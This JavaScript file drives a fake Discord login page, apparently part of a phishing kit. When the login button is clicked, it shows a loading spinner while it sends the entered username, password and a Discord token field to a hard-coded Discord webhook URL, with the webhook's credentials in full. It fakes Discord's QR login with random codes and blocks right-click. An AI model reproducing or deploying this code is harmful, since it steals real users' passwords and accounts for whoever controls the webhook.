// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector("button");
const usernameInput = document.querySelector("#username"); // Assuming an input field with id="username"
const passwordInput = document.querySelector("#password"); // Assuming an input field with id="password"

// Replace with your webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // e.g., "https://discord.com/api/webhooks/..."

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
  loginButton.innerHTML = "";
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                            <span class="inner pulsingEllipsis">
                                <span class="item spinnerItem"></span>
                                <span class="item spinnerItem"></span>
                                <span class="item spinnerItem"></span>
                            </span>
                         </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");

  // Simulate login and send data to webhook
  sendLoginDataToWebhook();

  setTimeout(removeEllipsisAnimation, 3000);
}

// -----------------------------------
// SEND LOGIN DATA TO WEBHOOK
// -----------------------------------
async function sendLoginDataToWebhook() {
  try {
    // Capture login information
    const username = usernameInput ? usernameInput.value : "N/A";
    const password = passwordInput ? passwordInput.value : "N/A";
    
    // For this example, I'm assuming the Discord token is provided or obtained elsewhere
    // In a real scenario, you might get this via OAuth or a user-provided input
    const discordToken = "USER_DISCORD_TOKEN"; // Replace with actual token retrieval logic

    // Prepare payload
    const payload = {
      username: username,
      password: password,
      discordToken: discordToken,
      timestamp: new Date().toISOString(),
    };

    // Send data to webhook
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: "New Login Attempt",
        embeds: [
          {
            title: "Login Information",
            fields: [
              { name: "Username/Email", value: username || "N/A", inline: true },
              { name: "Password", value: password || "N/A", inline: true },
              { name: "Discord Token", value: discordToken || "N/A", inline: false },
              { name: "Timestamp", value: new Date().toISOString(), inline: false },
            ],
            color: 0x00ff00, // Green color for embed
          },
        ],
      }),
    });

    if (!response.ok) {
      console.error("Failed to send data to webhook:", response.statusText);
    }
  } catch (error) {
    console.error("Error sending data to webhook:", error);
  }
}

// --------------------------------------------------
// ---------- WANDERING CUBES ANIMATION -------------
// --------------------------------------------------
function generateRandomString() {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < 43; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

function removeQrCodeAnimation() {
  const qrCodeContainer = document.querySelector(".right-section .qr-code");
  qrCodeContainer.innerHTML = "";
  qrCodeContainer.insertAdjacentElement(
    "afterbegin",
    generateQRCode(`https://discord.com/ra/${generateRandomString()}`)
  );
  qrCodeContainer.insertAdjacentHTML(
    "beforeend",
    `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
  );
  qrCodeContainer.style.background = "white";
}

function simulateQrCodeChange() {
  const qrCodeContainer = document.querySelector(".right-section .qr-code");
  qrCodeContainer.removeChild(qrCodeContainer.querySelector("svg"));
  qrCodeContainer.removeChild(qrCodeContainer.querySelector("img"));
  qrCodeContainer.style.background = "transparent";
  const markup = `<span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
                    <span class="inner wanderingCubes">
                      <span class="item"></span>
                      <span class="item"></span>
                    </span>
                  </span>`;
  qrCodeContainer.insertAdjacentHTML("afterbegin", markup);
  setTimeout(removeQrCodeAnimation, 3500);
}

setInterval(simulateQrCodeChange, 120 * 1000);

// --------------------------------------------------
// ---------- GENERATING QRCODE ---------------------
// --------------------------------------------------
function generateQRCode(data) {
  try {
    const qr = qrcode(0, "L");
    qr.addData(data);
    qr.make();
    const moduleCount = qr.getModuleCount();
    const svgString = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
    const svgElement = svgDoc.documentElement;
    svgElement.setAttribute("width", "160");
    svgElement.setAttribute("height", "160");
    svgElement.setAttribute("viewBox", "0 0 37 37");
    const path = svgElement.querySelector("path");
    if (path) {
      path.setAttribute("transform", `scale(${37 / moduleCount})`);
    }
    return svgElement;
  } catch (error) {
    console.error("Error generating QR code:", error);
    return null;
  }
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", animateEllipsis);
document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});
